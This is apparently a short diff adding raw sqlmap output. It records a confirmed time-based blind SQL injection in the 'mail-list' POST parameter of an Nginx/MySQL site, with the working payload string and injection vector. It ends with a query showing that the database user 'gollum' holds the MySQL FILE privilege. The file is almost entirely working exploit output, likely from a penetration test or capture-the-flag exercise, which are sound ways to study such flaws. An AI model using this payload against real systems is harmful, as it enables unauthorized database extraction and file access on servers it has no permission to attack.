@@ -1,0 +1,13 @@
+sqlmap identified the following injection point(s) with a total of 40 HTTP(s) requests:
+---
+Parameter: mail-list (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: mail-list=test@test.com' AND (SELECT 7825 FROM (SELECT(SLEEP(5)))jaLy)-- Kxnd
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+---
+web application technology: Nginx 1.14.2
+back-end DBMS: MySQL >= 5.0.12
+SELECT privilege_type FROM 
+  information_schema.user_privileges WHERE grantee LIKE 
+  '%gollum%' AND privilege_type='FILE': 'FILE'
